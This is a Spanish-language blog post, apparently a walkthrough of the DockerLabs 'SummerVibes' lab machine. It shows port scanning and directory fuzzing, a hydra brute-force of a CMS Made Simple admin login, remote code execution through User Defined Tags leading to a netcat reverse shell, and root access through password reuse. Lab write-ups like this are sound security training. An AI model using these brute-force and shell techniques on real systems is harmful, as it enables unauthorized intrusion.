<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>DockerLabs - SummerVibes (hard) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="DockerLabs - SummerVibes (hard)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes.html" />
<meta property="og:url" content="http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-09T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="DockerLabs - SummerVibes (hard)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-12-09T00:00:00-06:00","datePublished":"2024-12-09T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"DockerLabs - SummerVibes (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes.html"},"url":"http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">DockerLabs - SummerVibes (hard)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-12-09T00:00:00-06:00" itemprop="datePublished">
        Dec 9, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="/assets/DockerLabs/SummerVibes/1.png" />
</p>

<ul>
  <li>Esta Máquina es de la plataforma de DockerLabs <a href="https://dockerlabs.es/">https://dockerlabs.es/</a> en mi opinión es fácil pero esta catalogada como difícil.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 172.17.0.2 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-09 00:52 CST
Nmap scan report <span class="k">for </span>172.17.0.2
Host is up <span class="o">(</span>0.000032s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 d1:19:f1:fa:48:16:af:8a:4a:89:2d:78:89:e9:2d:94 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b8:b7:2e:64:3e:ee:c3:2e:2e:be:99:07:4e:02:4f:16 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estas son las tecnologías que esta usando la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Apache2</span> <span class="no">Ubuntu</span> <span class="no">Default</span> <span class="no">Page</span><span class="p">:</span> <span class="no">It</span> <span class="n">works</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la página web.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/2.png" />
</p>

<ul>
  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para buscar alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 40
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://172.17.0.2
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 40
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275]
Progress: 220559 / 220560 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Si analizamos el código fuente de la pagina web encontramos esto que es interesante.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/3.png" />
</p>

<ul>
  <li>Vemos que tenemos un <code class="language-plaintext highlighter-rouge">CMS</code> <a href="https://www.cmsmadesimple.org/">https://www.cmsmadesimple.org/</a>.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/4.png" />
</p>

<ul>
  <li>Aquí podemos ver la versión.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/5.png" />
</p>

<ul>
  <li>Tenemos varias rutas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://172.17.0.2/cmsms <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 40
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://172.17.0.2/cmsms
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 40
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/modules/]
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/uploads/]
/doc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/doc/]
/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/admin/]
/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/assets/]
/lib                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/lib/]
/tmp                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://172.17.0.2/cmsms/tmp/]
</code></pre></div></div>

<ul>
  <li>Encontramos un panel de login.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/6.png" />
</p>

<ul>
  <li>
    <p>Vemos que el username por defecto es admin pero no sabemos la contraseña podemos hacer un ataque de fuerza bruta al panel para ver si la contraseña esta en algún diccionario <a href="https://sitemagic.org/sites/cms-guide/How-to-log-in.html#:~:text=The%20default%20username%20is%20admin,password%20immediately%20after%20log%20in!">https://sitemagic.org/sites/cms-guide/How-to-log-in.html#:~:text=The%20default%20username%20is%20admin,password%20immediately%20after%20log%20in!</a>.</p>
  </li>
  <li>
    <p>Capturamos la petición para ver como se tramita la petición.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/7.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form <span class="s2">"/cmsms/admin/login.php:username=^USER^&amp;password=^PASS^&amp;&amp;loginsubmit=Submit:User name or password incorrect"</span> <span class="nt">-VI</span>
</code></pre></div></div>

<ul>
  <li>Después de varios intentos encontramos las credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
</code></pre></div></div>

<ul>
  <li>Podemos entrar.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/8.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>
    <p>Si buscamos por vulnerabilidades encontramos la siguiente <a href="https://github.com/capture0x/CMSMadeSimple">https://github.com/capture0x/CMSMadeSimple</a> la versión que esta usando es vulnerable a Remote Code Execution.</p>
  </li>
  <li>
    <p>Nos dan los pasos para explotar la vulnerabilidad en este caso tenemos que ir a User Defined Tags.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/9.png" />
</p>

<ul>
  <li>
    <p>Vamos a darle en Add.</p>
  </li>
  <li>
    <p>Vamos a comprobar que se ejecutan los comandos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/10.png" />
</p>

<ul>
  <li>Ahora le damos click al tag y le damos en RUN.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/11.png" />
</p>

<ul>
  <li>Y funciona.</li>
</ul>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/12.png" />
</p>

<ul>
  <li>Ahora nos vamos a enviar una reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/14.png" />
</p>

<blockquote>
  <p>Hay que poner un nombre bien el de la imagen te dará error -&gt; RUN.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.1.65] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.17.0.2] 49072
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>25<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@fc2f986ff0d9:/var/www/html/cmsms/admin<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
CTRL+Z
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
ENTER
www-data@fc2f986ff0d9:/var/www/html/cmsms/admin<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Bueno al parecer después de enumerar root usa la contraseña chocolate que encontramos al principio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fc2f986ff0d9:/<span class="nv">$ </span>su root
Password: 
root@fc2f986ff0d9:/#
</code></pre></div></div>

  </div><a class="u-url" href="/dockerlabs/machines/hard/2024/12/09/SummerVibes.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
